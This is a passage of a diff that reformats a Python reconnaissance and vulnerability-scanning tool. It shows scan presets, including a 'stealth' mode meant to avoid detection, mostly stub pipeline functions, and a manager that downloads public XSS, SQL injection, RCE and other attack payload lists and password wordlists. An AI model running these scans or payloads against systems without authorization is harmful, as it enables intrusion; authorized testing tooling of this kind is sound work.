stop_monitoring(self):\n         \"\"\"Stop performance monitoring\"\"\"\n         self.monitoring = False\n         if self.monitor_thread:\n             self.monitor_thread.join(timeout=1)\n             logger.log(\"Performance monitoring stopped\", \"INFO\")\n-    \n+\n     def _monitor_loop(self):\n         \"\"\"Main monitoring loop\"\"\"\n         import psutil\n+\n         while self.monitoring:\n             try:\n                 metrics = {\n-                    'timestamp': datetime.now().isoformat(),\n-                    'cpu_percent': psutil.cpu_percent(interval=0.1),\n-                    'memory_percent': psutil.virtual_memory().percent,\n-                    'disk_percent': psutil.disk_usage('/').percent,\n-                    'uptime_seconds': time.time() - self.start_time\n+                    \"timestamp\": datetime.now().isoformat(),\n+                    \"cpu_percent\": psutil.cpu_percent(interval=0.1),\n+                    \"memory_percent\": psutil.virtual_memory().percent,\n+                    \"disk_percent\": psutil.disk_usage(\"/\").percent,\n+                    \"uptime_seconds\": time.time() - self.start_time,\n                 }\n                 self.metrics_history.append(metrics)\n                 if len(self.metrics_history) > self.max_history:\n                     self.metrics_history.pop(0)\n                 time.sleep(5)  # Collect metrics every 5 seconds\n             except Exception:\n                 pass  # Continue monitoring even if errors occur\n-    \n+\n     def get_current_metrics(self):\n         \"\"\"Get the most recent metrics\"\"\"\n         return self.metrics_history[-1] if self.metrics_history else None\n-    \n+\n     def should_throttle_operations(self) -> bool:\n         \"\"\"Check if operations should be throttled based on current resources\"\"\"\n         current = self.get_current_metrics()\n         if not current:\n             return False\n-        \n-        cpu_high = current.get('cpu_percent', 0) > 85\n-        memory_high = current.get('memory_percent', 0) > 85\n-        \n+\n+        cpu_high = current.get(\"cpu_percent\", 0) > 85\n+        memory_high = current.get(\"memory_percent\", 0) > 85\n+\n         return cpu_high or memory_high\n-    \n+\n     def get_optimal_threads(self) -> int:\n         \"\"\"Calculate optimal number of threads based on current system load\"\"\"\n         if not HAS_PSUTIL:\n             return 2  # Safe default\n-        \n+\n         import psutil\n+\n         current = self.get_current_metrics()\n         base_threads = psutil.cpu_count() or 2\n-        \n+\n         if not current:\n             return max(1, base_threads // 2)\n-        \n-        cpu_percent = current.get('cpu_percent', 0)\n-        memory_percent = current.get('memory_percent', 0)\n-        \n+\n+        cpu_percent = current.get(\"cpu_percent\", 0)\n+        memory_percent = current.get(\"memory_percent\", 0)\n+\n         # Reduce threads based on system load\n         if cpu_percent > 80 or memory_percent > 80:\n             return max(1, base_threads // 4)\n         elif cpu_percent > 60 or memory_percent > 60:\n             return max(1, base_threads // 2)\n@@ -1558,167 +1768,267 @@\n \n \n # Check if psutil is available for performance monitoring\n try:\n     import psutil\n+\n     HAS_PSUTIL = True\n except ImportError:\n     HAS_PSUTIL = False\n \n # Global performance monitor\n GLOBAL_PERFORMANCE_MONITOR = PerformanceMonitor()\n \n \n # ---------- Preset Scan Configurations ----------\n+\n \n class ScanPresets:\n     \"\"\"Pre-configured scan types and option combinations for easy activation\"\"\"\n \n     SCAN_PRESETS = {\n         \"quick\": {\n             \"name\": \"Quick Scan\",\n             \"description\": \"Fast reconnaissance and basic vulnerability scan\",\n             \"duration\": \"5-10 minutes\",\n-            \"modules\": [\"subdomain_discovery\", \"port_scan_top100\", \"http_probe\", \"basic_vuln_scan\"],\n+            \"modules\": [\n+                \"subdomain_discovery\",\n+                \"port_scan_top100\",\n+                \"http_probe\",\n+                \"basic_vuln_scan\",\n+            ],\n             \"config\": {\n                 \"nuclei\": {\"severity\": \"high,critical\", \"rps\": 1000, \"timeout\": 10},\n                 \"port_scan\": {\"top_ports\": 100, \"timing\": 4},\n                 \"subdomain_tools\": [\"subfinder\", \"httpx\"],\n-                \"concurrency\": 20\n-            }\n+                \"concurrency\": 20,\n+            },\n         },\n         \"standard\": {\n             \"name\": \"Standard Scan\",\n             \"description\": \"Comprehensive reconnaissance and vulnerability assessment\",\n             \"duration\": \"15-30 minutes\",\n-            \"modules\": [\"subdomain_discovery\", \"port_scan_top1000\", \"http_probe\", \"directory_fuzzing\", \"vuln_scan\", \"tech_detection\"],\n+            \"modules\": [\n+                \"subdomain_discovery\",\n+                \"port_scan_top1000\",\n+                \"http_probe\",\n+                \"directory_fuzzing\",\n+                \"vuln_scan\",\n+                \"tech_detection\",\n+            ],\n             \"config\": {\n-                \"nuclei\": {\"severity\": \"info,low,medium,high,critical\", \"rps\": 800, \"timeout\": 15},\n+                \"nuclei\": {\n+                    \"severity\": \"info,low,medium,high,critical\",\n+                    \"rps\": 800,\n+                    \"timeout\": 15,\n+                },\n                 \"port_scan\": {\"top_ports\": 1000, \"timing\": 4},\n                 \"subdomain_tools\": [\"subfinder\", \"amass\", \"httpx\"],\n                 \"fuzzing\": {\"threads\": 30, \"wordlist\": \"medium\"},\n-                \"concurrency\": 25\n-            }\n+                \"concurrency\": 25,\n+            },\n         },\n         \"deep\": {\n             \"name\": \"Deep Scan\",\n             \"description\": \"Extensive reconnaissance with thorough vulnerability testing\",\n             \"duration\": \"45-90 minutes\",\n-            \"modules\": [\"subdomain_discovery\", \"full_port_scan\", \"http_probe\", \"directory_fuzzing\", \"parameter_discovery\", \"vuln_scan\", \"tech_detection\", \"web_crawling\"],\n+            \"modules\": [\n+                \"subdomain_discovery\",\n+                \"full_port_scan\",\n+                \"http_probe\",\n+                \"directory_fuzzing\",\n+                \"parameter_discovery\",\n+                \"vuln_scan\",\n+                \"tech_detection\",\n+                \"web_crawling\",\n+            ],\n             \"config\": {\n-                \"nuclei\": {\"severity\": \"info,low,medium,high,critical\", \"rps\": 600, \"timeout\": 30},\n+                \"nuclei\": {\n+                    \"severity\": \"info,low,medium,high,critical\",\n+                    \"rps\": 600,\n+                    \"timeout\": 30,\n+                },\n                 \"port_scan\": {\"all_ports\": True, \"timing\": 3},\n-                \"subdomain_tools\": [\"subfinder\", \"amass\", \"assetfinder\", \"findomain\", \"httpx\"],\n+                \"subdomain_tools\": [\n+                    \"subfinder\",\n+                    \"amass\",\n+                    \"assetfinder\",\n+                    \"findomain\",\n+                    \"httpx\",\n+                ],\n                 \"fuzzing\": {\"threads\": 50, \"wordlist\": \"large\", \"recursive\": True},\n                 \"parameter_discovery\": True,\n                 \"web_crawling\": True,\n-                \"concurrency\": 30\n-            }\n+                \"concurrency\": 30,\n+            },\n         },\n         \"stealth\": {\n             \"name\": \"Stealth Scan\",\n             \"description\": \"Low-profile scanning to avoid detection\",\n             \"duration\": \"30-60 minutes\",\n-            \"modules\": [\"passive_subdomain_discovery\", \"stealth_port_scan\", \"http_probe\", \"vuln_scan\"],\n+            \"modules\": [\n+                \"passive_subdomain_discovery\",\n+                \"stealth_port_scan\",\n+                \"http_probe\",\n+                \"vuln_scan\",\n+            ],\n             \"config\": {\n-                \"nuclei\": {\"severity\": \"medium,high,critical\", \"rps\": 100, \"timeout\": 30},\n+                \"nuclei\": {\n+                    \"severity\": \"medium,high,critical\",\n+                    \"rps\": 100,\n+                    \"timeout\": 30,\n+                },\n                 \"port_scan\": {\"timing\": 1, \"top_ports\": 100},\n                 \"subdomain_tools\": [\"passive_only\"],\n                 \"stealth_mode\": True,\n                 \"delays\": {\"between_requests\": 2, \"between_tools\": 5},\n-                \"concurrency\": 5\n-            }\n+                \"concurrency\": 5,\n+            },\n         },\n         \"webapp\": {\n             \"name\": \"Web Application Focused\",\n             \"description\": \"Specialized scan for web application security testing\",\n             \"duration\": \"20-45 minutes\",\n-            \"modules\": [\"subdomain_discovery\", \"http_probe\", \"directory_fuzzing\", \"parameter_discovery\", \"web_vuln_scan\", \"api_testing\"],\n+            \"modules\": [\n+                \"subdomain_discovery\",\n+                \"http_probe\",\n+                \"directory_fuzzing\",\n+                \"parameter_discovery\",\n+                \"web_vuln_scan\",\n+                \"api_testing\",\n+            ],\n             \"config\": {\n-                \"nuclei\": {\"tags\": \"web,xss,sqli,lfi,rce\", \"severity\": \"low,medium,high,critical\"},\n+                \"nuclei\": {\n+                    \"tags\": \"web,xss,sqli,lfi,rce\",\n+                    \"severity\": \"low,medium,high,critical\",\n+                },\n                 \"port_scan\": {\"ports\": [80, 443, 8080, 8443, 3000, 5000, 8000, 9000]},\n-                \"fuzzing\": {\"wordlists\": [\"directories\", \"files\", \"parameters\"], \"extensions\": [\".php\", \".asp\", \".jsp\", \".do\"]},\n+                \"fuzzing\": {\n+                    \"wordlists\": [\"directories\", \"files\", \"parameters\"],\n+                    \"extensions\": [\".php\", \".asp\", \".jsp\", \".do\"],\n+                },\n                 \"parameter_discovery\": True,\n                 \"api_testing\": True,\n-                \"concurrency\": 20\n-            }\n+                \"concurrency\": 20,\n+            },\n         },\n         \"api\": {\n             \"name\": \"API Security Scan\",\n             \"description\": \"Focused on API endpoint discovery and security testing\",\n             \"duration\": \"15-30 minutes\",\n-            \"modules\": [\"subdomain_discovery\", \"api_discovery\", \"endpoint_enumeration\", \"api_vuln_scan\"],\n+            \"modules\": [\n+                \"subdomain_discovery\",\n+                \"api_discovery\",\n+                \"endpoint_enumeration\",\n+                \"api_vuln_scan\",\n+            ],\n             \"config\": {\n-                \"nuclei\": {\"tags\": \"api,jwt,graphql,rest\", \"severity\": \"medium,high,critical\"},\n+                \"nuclei\": {\n+                    \"tags\": \"api,jwt,graphql,rest\",\n+                    \"severity\": \"medium,high,critical\",\n+                },\n                 \"port_scan\": {\"ports\": [80, 443, 8080, 8443, 3000, 5000, 8001, 9001]},\n                 \"api_wordlists\": [\"api_paths\", \"endpoints\", \"parameters\"],\n                 \"graphql_discovery\": True,\n                 \"swagger_discovery\": True,\n-                \"concurrency\": 15\n-            }\n+                \"concurrency\": 15,\n+            },\n         },\n         \"cloud\": {\n             \"name\": \"Cloud Security Scan\",\n             \"description\": \"Cloud infrastructure and service security assessment\",\n             \"duration\": \"25-45 minutes\",\n-            \"modules\": [\"subdomain_discovery\", \"cloud_storage_enum\", \"cloud_service_discovery\", \"cloud_vuln_scan\"],\n+            \"modules\": [\n+                \"subdomain_discovery\",\n+                \"cloud_storage_enum\",\n+                \"cloud_service_discovery\",\n+                \"cloud_vuln_scan\",\n+            ],\n             \"config\": {\n-                \"nuclei\": {\"tags\": \"cloud,aws,azure,gcp,s3,storage\", \"severity\": \"medium,high,critical\"},\n+                \"nuclei\": {\n+                    \"tags\": \"cloud,aws,azure,gcp,s3,storage\",\n+                    \"severity\": \"medium,high,critical\",\n+                },\n                 \"cloud_providers\": [\"aws\", \"azure\", \"gcp\"],\n                 \"storage_enumeration\": True,\n                 \"cloud_metadata\": True,\n-                \"concurrency\": 10\n-            }\n+                \"concurrency\": 10,\n+            },\n         },\n         \"mobile\": {\n             \"name\": \"Mobile Application Backend\",\n             \"description\": \"Security testing for mobile app backend services\",\n             \"duration\": \"20-40 minutes\",\n-            \"modules\": [\"subdomain_discovery\", \"api_discovery\", \"mobile_endpoint_scan\", \"mobile_vuln_scan\"],\n+            \"modules\": [\n+                \"subdomain_discovery\",\n+                \"api_discovery\",\n+                \"mobile_endpoint_scan\",\n+                \"mobile_vuln_scan\",\n+            ],\n             \"config\": {\n-                \"nuclei\": {\"tags\": \"mobile,api,jwt,oauth\", \"severity\": \"medium,high,critical\"},\n+                \"nuclei\": {\n+                    \"tags\": \"mobile,api,jwt,oauth\",\n+                    \"severity\": \"medium,high,critical\",\n+                },\n                 \"port_scan\": {\"ports\": [80, 443, 8080, 8443, 9000, 9001, 3000, 5000]},\n                 \"mobile_patterns\": True,\n                 \"jwt_testing\": True,\n                 \"oauth_testing\": True,\n-                \"concurrency\": 15\n-            }\n+                \"concurrency\": 15,\n+            },\n         },\n         \"internal\": {\n             \"name\": \"Internal Network Scan\",\n             \"description\": \"Internal network and service discovery\",\n             \"duration\": \"30-60 minutes\",\n-            \"modules\": [\"network_discovery\", \"full_port_scan\", \"service_enumeration\", \"internal_vuln_scan\"],\n+            \"modules\": [\n+                \"network_discovery\",\n+                \"full_port_scan\",\n+                \"service_enumeration\",\n+                \"internal_vuln_scan\",\n+            ],\n             \"config\": {\n-                \"nuclei\": {\"tags\": \"network,smb,ssh,rdp,ftp\", \"severity\": \"low,medium,high,critical\"},\n+                \"nuclei\": {\n+                    \"tags\": \"network,smb,ssh,rdp,ftp\",\n+                    \"severity\": \"low,medium,high,critical\",\n+                },\n                 \"port_scan\": {\"all_ports\": True, \"timing\": 4},\n                 \"network_scan\": True,\n                 \"service_enumeration\": True,\n                 \"internal_services\": True,\n-                \"concurrency\": 20\n-            }\n+                \"concurrency\": 20,\n+            },\n         },\n         \"bounty\": {\n             \"name\": \"Bug Bounty Optimized\",\n             \"description\": \"Optimized for bug bounty hunting with comprehensive coverage\",\n             \"duration\": \"60-120 minutes\",\n-            \"modules\": [\"extensive_subdomain_discovery\", \"full_port_scan\", \"directory_fuzzing\", \"parameter_discovery\", \"comprehensive_vuln_scan\", \"manual_verification\"],\n+            \"modules\": [\n+                \"extensive_subdomain_discovery\",\n+                \"full_port_scan\",\n+                \"directory_fuzzing\",\n+                \"parameter_discovery\",\n+                \"comprehensive_vuln_scan\",\n+                \"manual_verification\",\n+            ],\n             \"config\": {\n-                \"nuclei\": {\"severity\": \"info,low,medium,high,critical\", \"all_templates\": True},\n+                \"nuclei\": {\n+                    \"severity\": \"info,low,medium,high,critical\",\n+                    \"all_templates\": True,\n+                },\n                 \"subdomain_tools\": [\"all_available\"],\n                 \"fuzzing\": {\"wordlist\": \"extensive\", \"threads\": 100, \"recursive\": True},\n                 \"parameter_discovery\": True,\n                 \"tech_stack_analysis\": True,\n                 \"comprehensive_crawling\": True,\n                 \"manual_verification\": True,\n-                \"concurrency\": 50\n-            }\n-        }\n+                \"concurrency\": 50,\n+            },\n+        },\n     }\n \n     @staticmethod\n-\n     def list_presets():\n         \"\"\"Display available scan presets\"\"\"\n         print(\"\\n\\033[92m\ud83c\udfaf Available Scan Presets:\\033[0m\")\n \n         for preset_id, preset in ScanPresets.SCAN_PRESETS.items():\n@@ -1726,17 +2036,15 @@\n             print(f\"    \ud83d\udcdd {preset['description']}\")\n             print(f\"    \u23f1\ufe0f  Duration: {preset['duration']}\")\n             print(f\"    \ud83d\udd27 Modules: {', '.join(preset['modules'])}\")\n \n     @staticmethod\n-\n     def get_preset(preset_name: str) -> Optional[Dict[str, Any]]:\n         \"\"\"Get a scan preset by name\"\"\"\n         return ScanPresets.SCAN_PRESETS.get(preset_name.lower())\n \n     @staticmethod\n-\n     def run_preset_scan(preset_name: str, targets: List[str] = None):\n         \"\"\"Run a scan using a preset configuration\"\"\"\n         preset = ScanPresets.get_preset(preset_name)\n \n         if not preset:\n@@ -1808,10 +2116,11 @@\n             # Generate report\n             logger.log(\"Generating scan report...\", \"INFO\")\n             stage_report(rd, env, cfg)\n             logger.log(f\"{preset['name']} scan completed\", \"SUCCESS\")\n \n+\n def run_preset_scan_menu():\n     \"\"\"Interactive menu for preset scan selection\"\"\"\n     print(f\"\\n\\033[96m{'='*80}\\033[0m\")\n     print(\"\\033[96mPRESET SCAN CONFIGURATIONS\".center(80) + \"\\033[0m\")\n     print(f\"\\033[96m{'='*80}\\033[0m\")\n@@ -1819,11 +2128,11 @@\n     ScanPresets.list_presets()\n \n     print(\"\\n\\033[95mSelect a preset or 'back' to return:\\033[0m\")\n     choice = input(\"\\033[93mPreset name: \\033[0m\").strip().lower()\n \n-    if choice == 'back':\n+    if choice == \"back\":\n         return\n \n     preset = ScanPresets.get_preset(choice)\n     if not preset:\n         logger.log(f\"Invalid preset: {choice}\", \"ERROR\")\n@@ -1843,18 +2152,23 @@\n     else:\n         logger.log(\"No targets configured! Please add targets first.\", \"ERROR\")\n         input(\"Press Enter to continue...\")\n         return\n \n-    confirm = input(f\"\\n\\033[93mProceed with {preset['name']} scan? (yes/no): \\033[0m\").strip().lower()\n-\n-    if confirm == 'yes':\n+    confirm = (\n+        input(f\"\\n\\033[93mProceed with {preset['name']} scan? (yes/no): \\033[0m\")\n+        .strip()\n+        .lower()\n+    )\n+\n+    if confirm == \"yes\":\n         ScanPresets.run_preset_scan(choice, targets)\n     else:\n         logger.log(\"Scan cancelled\", \"INFO\")\n \n     input(\"Press Enter to continue...\")\n+\n \n # Supporting functions for preset scans\n def run_subdomain_discovery_with_config(rd, env, cfg, preset_config):\n     \"\"\"Run subdomain discovery with preset configuration\"\"\"\n     tools = preset_config.get(\"subdomain_tools\", [\"subfinder\", \"httpx\"])\n@@ -1868,187 +2182,234 @@\n     else:\n         available_tools = tools\n \n     stage_recon(rd, env, cfg)  # Use existing function with config override\n \n+\n def run_port_scan_with_config(rd, env, cfg, scan_config):\n     \"\"\"Run port scan with specific configuration\"\"\"\n     # This would integrate with the port scanning functionality\n     # Implementation depends on the existing port scan functions\n     pass\n \n+\n def run_http_probe_with_config(rd, env, cfg, preset_config):\n     \"\"\"Run HTTP probing with preset configuration\"\"\"\n     # Use existing HTTP probing functionality\n     pass\n+\n \n def run_directory_fuzzing_with_config(rd, env, cfg, preset_config):\n     \"\"\"Run directory fuzzing with preset configuration\"\"\"\n     fuzzing_config = preset_config.get(\"fuzzing\", {})\n     # Implementation would use existing fuzzing functions\n     pass\n \n+\n def run_parameter_discovery_with_config(rd, env, cfg, preset_config):\n     \"\"\"Run parameter discovery with preset configuration\"\"\"\n     if preset_config.get(\"parameter_discovery\"):\n         # Use arjun or similar tools for parameter discovery\n         pass\n \n+\n def run_vulnerability_scan_with_config(rd, env, cfg, preset_config):\n     \"\"\"Run vulnerability scanning with preset configuration\"\"\"\n     stage_vuln_scan(rd, env, cfg)  # Use existing function\n+\n \n def run_tech_detection_with_config(rd, env, cfg, preset_config):\n     \"\"\"Run technology detection with preset configuration\"\"\"\n     # Use whatweb, httpx tech-detect, etc.\n     pass\n \n+\n def run_web_crawling_with_config(rd, env, cfg, preset_config):\n     \"\"\"Run web crawling with preset configuration\"\"\"\n     # Use waybackurls, gau, gospider, etc.\n     pass\n \n+\n def run_api_testing_with_config(rd, env, cfg, preset_config):\n     \"\"\"Run API testing with preset configuration\"\"\"\n     # Use API-specific tools and tests\n     pass\n \n+\n def check_stop_condition() -> bool:\n     \"\"\"Check if user wants to stop the scan\"\"\"\n     # Implementation for graceful stopping\n     return False\n+\n \n class EnhancedPayloadManager:\n     \"\"\"Advanced payload and wordlist management system\"\"\"\n \n     PAYLOAD_CATEGORIES = {\n         \"xss\": {\n             \"description\": \"Cross-Site Scripting payloads\",\n             \"sources\": [\n                 \"https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt\",\n                 \"https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/README.md\",\n-                \"https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Jhaddix.txt\"\n+                \"https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Jhaddix.txt\",\n             ],\n-            \"local_files\": [\"xss_basic.txt\", \"xss_advanced.txt\", \"xss_bypass.txt\"]\n+            \"local_files\": [\"xss_basic.txt\", \"xss_advanced.txt\", \"xss_bypass.txt\"],\n         },\n         \"sqli\": {\n             \"description\": \"SQL Injection payloads\",\n             \"sources\": [\n                 \"https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/exploit_payloads.txt\",\n                 \"https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/README.md\",\n-                \"https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/SQLi/Generic-SQLi.txt\"\n+                \"https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/SQLi/Generic-SQLi.txt\",\n             ],\n-            \"local_files\": [\"sqli_basic.txt\", \"sqli_mssql.txt\", \"sqli_mysql.txt\", \"sqli_oracle.txt\", \"sqli_postgresql.txt\"]\n+            \"local_files\": [\n+                \"sqli_basic.txt\",\n+                \"sqli_mssql.txt\",\n+                \"sqli_mysql.txt\",\n+                \"sqli_oracle.txt\",\n+                \"sqli_postgresql.txt\",\n+            ],\n         },\n         \"lfi\": {\n             \"description\": \"Local File Inclusion payloads\",\n             \"sources\": [\n                 \"https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt\",\n-                \"https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt\"\n+                \"https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt\",\n             ],\n-            \"local_files\": [\"lfi_linux.txt\", \"lfi_windows.txt\", \"lfi_generic.txt\"]\n+            \"local_files\": [\"lfi_linux.txt\", \"lfi_windows.txt\", \"lfi_generic.txt\"],\n         },\n         \"rfi\": {\n             \"description\": \"Remote File Inclusion payloads\",\n             \"sources\": [\n                 \"https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt\"\n             ],\n-            \"local_files\": [\"rfi_basic.txt\", \"rfi_advanced.txt\"]\n+            \"local_files\": [\"rfi_basic.txt\", \"rfi_advanced.txt\"],\n         },\n         \"rce\": {\n             \"description\": \"Remote Code Execution payloads\",\n             \"sources\": [\n                 \"https://raw.githubusercontent.com/payloadbox/rce-payload-list/master/rce-payload-list.txt\",\n-                \"https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Command%20Injection/README.md\"\n+                \"https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Command%20Injection/README.md\",\n             ],\n-            \"local_files\": [\"rce_linux.txt\", \"rce_windows.txt\", \"rce_generic.txt\"]\n+            \"local_files\": [\"rce_linux.txt\", \"rce_windows.txt\", \"rce_generic.txt\"],\n         },\n         \"xxe\": {\n             \"description\": \"XML External Entity payloads\",\n             \"sources\": [\n                 \"https://raw.githubusercontent.com/payloadbox/xxe-payload-list/master/xxe-payload-list.txt\"\n             ],\n-            \"local_files\": [\"xxe_basic.txt\", \"xxe_advanced.txt\"]\n+            \"local_files\": [\"xxe_basic.txt\", \"xxe_advanced.txt\"],\n         },\n         \"ssti\": {\n             \"description\": \"Server-Side Template Injection payloads\",\n             \"sources\": [\n                 \"https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/README.md\"\n             ],\n-            \"local_files\": [\"ssti_jinja2.txt\", \"ssti_twig.txt\", \"ssti_smarty.txt\", \"ssti_generic.txt\"]\n+            \"local_files\": [\n+                \"ssti_jinja2.txt\",\n+                \"ssti_twig.txt\",\n+                \"ssti_smarty.txt\",\n+                \"ssti_generic.txt\",\n+            ],\n         },\n         \"idor\": {\n             \"description\": \"Insecure Direct Object Reference payloads\",\n-            \"local_files\": [\"idor_numeric.txt\", \"idor_uuid.txt\", \"idor_base64.txt\"]\n+            \"local_files\": [\"idor_numeric.txt\", \"idor_uuid.txt\", \"idor_base64.txt\"],\n         },\n         \"csrf\": {\n             \"description\": \"Cross-Site Request Forgery payloads\",\n-            \"local_files\": [\"csrf_tokens.txt\", \"csrf_bypass.txt\"]\n+            \"local_files\": [\"csrf_tokens.txt\", \"csrf_bypass.txt\"],\n         },\n         \"auth_bypass\": {\n             \"description\": \"Authentication bypass payloads\",\n-            \"local_files\": [\"auth_bypass_sql.txt\", \"auth_bypass_nosql.txt\", \"auth_bypass_ldap.txt\"]\n-        }\n+            \"local_files\": [\n+                \"auth_bypass_sql.txt\",\n+                \"auth_bypass_nosql.txt\",\n+                \"auth_bypass_ldap.txt\",\n+            ],\n+        },\n     }\n \n     WORDLIST_CATEGORIES = {\n         \"directories\": {\n             \"description\": \"Directory and path wordlists\",\n             \"sources\": [\n                 \"https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/directory-list-2.3-medium.txt\",\n                 \"https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt\",\n                 \"https://raw.githubusercontent.com/six2dez/OneListForAll/main/onelistforallmicro.txt\",\n-                \"https://raw.githubusercontent.com/assetnote/commonspeak2-wordlists/master/subdomains/subdomains.txt\"\n+                \"https://raw.githubusercontent.com/assetnote/commonspeak2-wordlists/master/subdomains/subdomains.txt\",\n             ],\n-            \"local_files\": [\"dirs_common.txt\", \"dirs_medium.txt\", \"dirs_large.txt\", \"dirs_api.txt\"]\n+            \"local_files\": [\n+                \"dirs_common.txt\",\n+                \"dirs_medium.txt\",\n+                \"dirs_large.txt\",\n+                \"dirs_api.txt\",\n+            ],\n         },\n         \"files\": {\n             \"description\": \"File and extension wordlists\",\n             \"sources\": [\n                 \"https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/web-extensions.txt\",\n-                \"https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt\"\n+                \"https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt\",\n             ],\n-            \"local_files\": [\"files_common.txt\", \"files_backup.txt\", \"files_config.txt\", \"files_logs.txt\"]\n+            \"local_files\": [\n+                \"files_common.txt\",\n+                \"files_backup.txt\",\n+                \"files_config.txt\",\n+                \"files_logs.txt\",\n+            ],\n         },\n         \"parameters\": {\n             \"description\": \"Parameter name wordlists\",\n             \"sources\": [\n                 \"https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt\",\n-                \"https://raw.githubusercontent.com/assetnote/commonspeak2-wordlists/master/wordlists/params.txt\"\n+                \"https://raw.githubusercontent.com/assetnote/commonspeak2-wordlists/master/wordlists/params.txt\",\n             ],\n-            \"local_files\": [\"params_common.txt\", \"params_api.txt\", \"params_php.txt\", \"params_asp.txt\"]\n+            \"local_files\": [\n+                \"params_common.txt\",\n+                \"params_api.txt\",\n+                \"params_php.txt\",\n+                \"params_asp.txt\",\n+            ],\n         },\n         \"subdomains\": {\n             \"description\": \"Subdomain wordlists\",\n             \"sources\": [\n                 \"https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt\",\n-                \"https://raw.githubusercontent.com/assetnote/commonspeak2-wordlists/master/subdomains/subdomains.txt\"\n+                \"https://raw.githubusercontent.com/assetnote/commonspeak2-wordlists/master/subdomains/subdomains.txt\",\n             ],\n-            \"local_files\": [\"subdomains_common.txt\", \"subdomains_top1k.txt\", \"subdomains_top10k.txt\"]\n+            \"local_files\": [\n+                \"subdomains_common.txt\",\n+                \"subdomains_top1k.txt\",\n+                \"subdomains_top10k.txt\",\n+            ],\n         },\n         \"vhosts\": {\n             \"description\": \"Virtual host wordlists\",\n-            \"local_files\": [\"vhosts_common.txt\", \"vhosts_api.txt\", \"vhosts_admin.txt\"]\n+            \"local_files\": [\"vhosts_common.txt\", \"vhosts_api.txt\", \"vhosts_admin.txt\"],\n         },\n         \"users\": {\n             \"description\": \"Username wordlists\",\n             \"sources\": [\n                 \"https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt\"\n             ],\n-            \"local_files\": [\"users_common.txt\", \"users_admin.txt\", \"users_service.txt\"]\n+            \"local_files\": [\"users_common.txt\", \"users_admin.txt\", \"users_service.txt\"],\n         },\n         \"passwords\": {\n             \"description\": \"Password wordlists\",\n             \"sources\": [\n                 \"https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt\"\n             ],\n-            \"local_files\": [\"passwords_common.txt\", \"passwords_weak.txt\", \"passwords_default.txt\"]\n-        }\n+            \"local_files\": [\n+                \"passwords_common.txt\",\n+                \"passwords_weak.txt\",\n+                \"passwords_default.txt\",\n+            ],\n+        },\n     }\n \n     @staticmethod\n-\n     def initialize_payload_structure():\n         \"\"\"Initialize payload directory structure\"\"\"\n         try:\n             # Ensure base directories exist\n             PAYLOADS_DIR.mkdir(exist_ok=True)\n@@ -2069,14 +2430,17 @@\n         except Exception as e:\n             logger.log(f\"Failed to initialize payload structure: {e}\", \"ERROR\")\n             return False\n \n     @staticmethod\n-\n-    def download_payload_sources(category: str = None, force_update: bool = False) -> bool:\n+    def download_payload_sources(\n+        category: str = None, force_update: bool = False\n+    ) -> bool:\n         \"\"\"Download payload sources from remote repositories\"\"\"\n-        categories_to_update = [category] if category else EnhancedPayloadManager.PAYLOAD_CATEGORIES.keys()\n+        categories_to_update = (\n+            [category] if category else EnhancedPayloadManager.PAYLOAD_CATEGORIES.keys()\n+        )\n \n         success_count = 0\n         total_count = 0\n \n         for cat in categories_to_update:\n@@ -2087,30 +2451,35 @@\n                 total_count += 1\n \n                 try:\n                     # Generate filename from URL\n                     filename = Path(source_url).name\n-                    if not filename.endswith(('.txt', '.md')):\n-                        filename += '.txt'\n+                    if not filename.endswith((\".txt\", \".md\")):\n+                        filename += \".txt\"\n \n                     output_file = PAYLOADS_DIR / cat / filename\n \n                     # Skip if file exists and not forcing update\n                     if output_file.exists() and not force_update:\n-                        logger.log(f\"Skipping existing payload: {output_file.name}\", \"INFO\")\n+                        logger.log(\n+                            f\"Skipping existing payload: {output_file.name}\", \"INFO\"\n+                        )\n                         continue\n \n                     # Download with fallback tools\n-                    download_tool = get_best_available_tool(\"curl\") or get_best_available_tool(\"wget\")\n+                    download_tool = get_best_available_tool(\n+                        \"curl\"\n+                    ) or get_best_available_tool(\"wget\")\n \n                     if download_tool == \"curl\":\n                         cmd = [\"curl\", \"-s\", \"-L\", \"-o\", str(output_file), source_url]\n                     elif download_tool == \"wget\":\n                         cmd = [\"wget\", \"-q\", \"-O\", str(output_file), source_url]\n                     else:\n                         # Fallback to Python requests\n                         import requests\n+\n                         response = requests.get(source_url, timeout=30)\n                         response.raise_for_status()\n                         output_file.write_text(response.text)\n                         success_count += 1\n                         logger.log(f\"Downloaded payload: {filename}\", \"SUCCESS\")\n@@ -2124,15 